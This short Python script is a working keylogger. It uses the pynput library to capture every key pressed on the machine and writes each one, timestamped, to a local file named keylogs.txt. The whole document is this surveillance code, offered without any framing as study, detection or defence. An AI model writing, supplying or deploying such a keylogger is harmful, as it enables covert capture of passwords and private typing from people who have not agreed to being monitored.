from pynput.keyboard import Listener
import logging

log_dir = "keylogs.txt"

logging.basicConfig(filename=(log_dir), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
